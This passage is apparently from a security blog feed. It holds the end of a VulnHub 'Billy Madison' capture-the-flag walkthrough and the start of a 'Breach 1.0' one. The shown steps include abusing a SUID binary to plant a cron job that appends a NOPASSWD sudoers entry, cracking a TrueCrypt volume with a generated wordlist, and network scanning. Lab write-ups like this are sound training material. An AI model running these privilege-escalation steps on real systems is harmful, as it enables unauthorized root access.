<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#101;&amp;#114;&amp;#105;&amp;#x63;&amp;#x40;&amp;#x31;&amp;#48;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#57;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#101;&amp;#114;&amp;#x69;&amp;#x63;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#57;&lt;/a&gt; -p 1974</span>
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#101;&amp;#x72;&amp;#x69;&amp;#99;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#x39;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#101;&amp;#x72;&amp;#105;&amp;#99;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#57;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 16.04.1 LTS <span class="o">(</span>GNU/Linux 4.4.0-36-generic x86_64<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com&quot;</span>&gt;https://help.ubuntu.com&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Management:     &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com&quot;</span>&gt;https://landscape.canonical.com&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Support:        &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://ubuntu.com/advantage&quot;</span>&gt;https://ubuntu.com/advantage&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;37 packages can be updated.
</span><span class='line'><span class="m">0</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Last login: Sat Aug <span class="m">20</span> 22:28:28 <span class="m">2016</span> from 192.168.3.101
</span><span class='line'>eric@BM:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span>
</span><span class='line'>eric@BM:~<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/eric
</span><span class='line'>eric@BM:~<span class="nv">$ </span>ls -la
</span><span class='line'>total 532
</span><span class='line'>drwxr-xr-x <span class="m">3</span> eric eric   <span class="m">4096</span> Aug <span class="m">23</span> 00:18 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root   <span class="m">4096</span> Aug <span class="m">20</span> 13:56 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric    <span class="m">220</span> Aug <span class="m">20</span> 13:56 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric   <span class="m">3771</span> Aug <span class="m">20</span> 13:56 .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> eric eric   <span class="m">4096</span> Aug <span class="m">20</span> 14:07 .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root <span class="m">451085</span> Aug  <span class="m">7</span> 22:31 eric-tongue-animated.gif
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root  <span class="m">60710</span> Aug  <span class="m">7</span> 22:29 eric-unimpressed.jpg
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric    <span class="m">655</span> Aug <span class="m">20</span> 13:56 .profile
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">115</span> Aug <span class="m">20</span> 20:41 why-1974.txt
</span><span class='line'>eric@BM:~<span class="nv">$ </span>uname -a
</span><span class='line'>Linux BM 4.4.0-36-generic <span class="c">#55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'>eric@BM:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I&rsquo;m in.</p>

<p>Then I did enumeration and preperation for rooting.</p>

<p>However, both <code>LinEnum.sh</code> and <code>linuxprivchecker.py</code> have not give me any positive suggestion to priv escalation.</p>

<p>Then I followed the g0tm1lk&rsquo;s <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="Basic Linux Privilege Escalation Guide">basic linux privilege escalation</a>, and found a program file which sticky bit is set.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:/etc/cron.hourly# find / -perm -g<span class="o">=</span>s -perm -u<span class="o">=</span>s -type f -ls 2&gt;/dev/null
</span><span class='line'>  <span class="m">1454477</span>    <span class="m">368</span> -r-sr-s<span class="p">&amp;</span>mdash<span class="p">;</span>   <span class="m">1</span> root     eric       <span class="m">372922</span> Aug <span class="m">20</span> 22:35 /usr/local/share/sgml/donpcgd
</span><span class='line'>  <span class="m">1058032</span>     <span class="m">52</span> -rwsr-sr-x   <span class="m">1</span> daemon   daemon      <span class="m">51464</span> Jan <span class="m">14</span>  <span class="m">2016</span> /usr/bin/at
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking with the target program <font color="red"><code>/usr/local/share/sgml/donpcgd</code></font>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~# /usr/local/share/sgml/donpcgd
</span><span class='line'>Usage: /usr/local/share/sgml/donpcgd path1 path2&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~# /usr/local/share/sgml/donpcgd /etc/shadow /tmp/shadow&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h4&gt;mknod<span class="o">(</span>/tmp/shadow,81a0,0<span class="o">)</span>&lt;/h4&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~# ls -al /tmp/shadow
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root shadow <span class="m">0</span> Jan  <span class="m">7</span> 04:55 /tmp/shadow
</span></code></pre></td></tr></table></div></figure></p>

<p>This program will copy the file in path1 to path2 (only name is same, but the content will not be copied. the new file is empty.)</p>

<p>so that means, I can create file to any location by taking advantage of this program.</p>

<p>Then I created a <code>cron.hourly</code> entry which including a bash script to add eric into the sudoers.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~<span class="nv">$ </span>touch /tmp/rootme
</span><span class='line'>eric@BM:~<span class="nv">$ </span>/usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h4&gt;mknod<span class="o">(</span>/etc/cron.hourly/rootme,81b4,0<span class="o">)</span>&lt;/h4&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~<span class="nv">$ </span><span class="nb">echo</span> -e <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="c">#!/bin/bash\necho &amp;ldquo;eric ALL=(ALL) NOPASSWD:ALL&amp;rdquo; &gt;&gt; /etc/sudoers&amp;rsquo; &gt; /etc/cron.hourly/rootme</span>
</span><span class='line'>eric@BM:~<span class="nv">$ </span>chmod +x /etc/cron.hourly/rootme
</span><span class='line'>eric@BM:~<span class="nv">$ </span>cat /etc/cron.hourly/rootme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span>eric <span class="nv">ALL</span><span class="o">=(</span>ALL<span class="o">)</span> NOPASSWD:ALL<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt;&gt; /etc/sudoers
</span></code></pre></td></tr></table></div></figure></p>

<p>After 1 hour waiting, I try to check if the <code>rootme</code> is executed correctly by using command <code>sudo su</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~<span class="nv">$ </span>sudo su
</span><span class='line'>root@BM:/home/eric# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@BM:/home/eric#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now I am the root!!</p>

<p>Then found <code>hint.txt</code> and <code>BowelMovement</code> in folder <code>/PRIVATE</code>, downloaded these two files by using <code>nc</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@BM:/PRIVATE# cat hint.txt
</span><span class='line'>Heh, I called the file BowelMovement because it has the same initials as
</span><span class='line'>Billy Madison.  That truely cracks me up!  LOLOLOL!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I always forget the password, but it<span class="p">&amp;</span>rsquo<span class="p">;</span>s here:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://en.wikipedia.org/wiki/Billy_Madison&quot;</span>&gt;https://en.wikipedia.org/wiki/Billy_Madison&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-EG
</span></code></pre></td></tr></table></div></figure></p>

<p>From the link, I use <code>cewl</code> to generate a wordlist:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/root/myTest/BillyMadison1.1# cewl <span class="p">&amp;</span>ndash<span class="p">;</span>depth <span class="m">0</span> -w billy-wiki.list &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://en.wikipedia.org/wiki/Billy_Madison&quot;</span>&gt;https://en.wikipedia.org/wiki/Billy_Madison&lt;/a&gt;
</span><span class='line'>CeWL 5.3 <span class="o">(</span>Heading Upwards<span class="o">)</span> Robin Wood <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#114;&amp;#111;&amp;#x62;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x64;&amp;#105;&amp;#x67;&amp;#x69;&amp;#46;&amp;#x6e;&amp;#x69;&amp;#110;&amp;#106;&amp;#x61;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x72;&amp;#111;&amp;#x62;&amp;#x69;&amp;#x6e;&amp;#x40;&amp;#x64;&amp;#105;&amp;#x67;&amp;#x69;&amp;#x2e;&amp;#110;&amp;#105;&amp;#110;&amp;#x6a;&amp;#97;&lt;/a&gt;) (&lt;a href=&quot;https://digi.ninja/&quot;&gt;https://digi.ninja/&lt;/a&gt;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using <code>truecrack</code> with wordlist to crack <code>BowelMovement</code>, the password is guessed successfully.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# truecrack -w billy-wiki.list -t BowelMovement
</span><span class='line'>TrueCrack v3.0
</span><span class='line'>Website: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://code.google.com/p/truecrack&quot;</span>&gt;http://code.google.com/p/truecrack&lt;/a&gt;
</span><span class='line'>Contact us: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x69;&amp;#110;&amp;#x66;&amp;#111;&amp;#116;&amp;#x72;&amp;#117;&amp;#x65;&amp;#99;&amp;#114;&amp;#97;&amp;#x63;&amp;#107;&amp;#x40;&amp;#103;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x69;&amp;#110;&amp;#102;&amp;#111;&amp;#x74;&amp;#114;&amp;#x75;&amp;#101;&amp;#x63;&amp;#114;&amp;#97;&amp;#x63;&amp;#107;&amp;#x40;&amp;#x67;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;&lt;/a&gt;</span>
</span><span class='line'>Found password:     <span class="p">&amp;</span>ldquo<span class="p">;</span>execrable<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>Password length:    <span class="p">&amp;</span>ldquo<span class="p">;</span>10<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>Total computations: <span class="p">&amp;</span>ldquo<span class="p">;</span>606<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, then I downloaded and installed the tool <a href="https://veracrypt.codeplex.com/wikipage?title=Downloads" title="veracrypt"><code>veracrypt</code></a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# mkdir billy-vera
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1# veracrypt -tc BowelMovement billy-vera&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1# <span class="nb">cd </span>billy-vera/
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# ls
</span><span class='line'><span class="nv">$RECYCLE</span>.BIN  secret.zip
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# unzip secret.zip
</span><span class='line'>Archive:  secret.zip
</span><span class='line'>  inflating: Billy_Madison_12th_Grade_Final_Project.doc&lt;br/&gt;
</span><span class='line'>  inflating: THE-END.txt           &lt;br/&gt;
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# ls
</span><span class='line'>Billy_Madison_12th_Grade_Final_Project.doc  <span class="nv">$RECYCLE</span>.BIN  secret.zip  THE-END.txt
</span><span class='line'><span class="nb">exit</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1/billy-vera# cat THE-END.txt
</span><span class='line'>Congratulations!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If you<span class="p">&amp;</span>rsquo<span class="p">;</span>re reading this, you win!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I hope you had fun.  I had an absolute blast putting this together.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I<span class="p">&amp;</span>rsquo<span class="p">;</span>d love to have your feedback on the box - or at least know you pwned it!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Please feel free to shoot me a tweet or email <span class="o">(</span>7&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x6d;&amp;#x73;&amp;#x40;&amp;#x37;&amp;#109;&amp;#115;&amp;#x2e;&amp;#x75;&amp;#115;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#109;&amp;#x73;&amp;#64;&amp;#x37;&amp;#x6d;&amp;#115;&amp;#x2e;&amp;#117;&amp;#115;&lt;/a&gt;) and let me know with</span>
</span><span class='line'>the subject line: <span class="p">&amp;</span>ldquo<span class="p">;</span>Stop looking at me swan!<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks much,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Brian Johnson
</span><span class='line'><span class="m">7</span> Minute Security
</span><span class='line'>www.7ms.us
</span></code></pre></td></tr></table></div></figure></p>

<p>Done.</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Breach: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1/"/>
    <updated>2016-11-29T06:09:35-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1</id>
    <content type="html"><![CDATA[<p>&ldquo;First in a multi-part series, Breach 1.0 is meant to be beginner to intermediate boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence. Leave no stone unturned.</p>

<p>The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/mrb3n,293/">mrb3n</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>192.168.110.129/24</em>)</p>

<p>Target: Breach 1.0 (<em>192.168.110.140/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>192.168.110.1   00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>192.168.110.2   00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>192.168.110.128 00:0c:29:5f:3b:1a   VMware, Inc.
</span><span class='line'>192.168.110.140 00:0c:29:f1:0a:9f   VMware, Inc.
</span><span class='line'>192.168.110.254 00:50:56:e9:0a:b5   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;5 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.421 seconds <span class="o">(</span>105.74 hosts/sec<span class="o">)</span>. <span class="m">5</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>192.168.110.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p>Since we got all ports open when doing <code>masscan</code> ports scan, that sounds like the server is located behind an IDS or IPS.</p>

<p>Without the auto-port scanner, I have to check ports manually. So I started from common ports and port 80 would be the first come out~</p>

<p><img class="left" src="/downloads/Breach1/1.png"></p>

<p>Good, the target is providing WEB service, so I run <code>nikto</code> to do an auto scan on port 80.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# nikto -host 192.168.110.140 -output 192.168.110.140_nikto.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Target IP:          192.168.110.140&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Hostname:    192.168.110.140&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Start Time:         2016-11-27 14:36:24 <span class="o">(</span>GMT11<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, fields: 0x44a 0x534a04f49139d&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;No CGI Directories found <span class="o">(</span>use <span class="p">&amp;</span>lsquo<span class="p">;</span>-C all<span class="p">&amp;</span>rsquo<span class="p">;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3233: /icons/README: Apache default file found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;7535 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">11</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
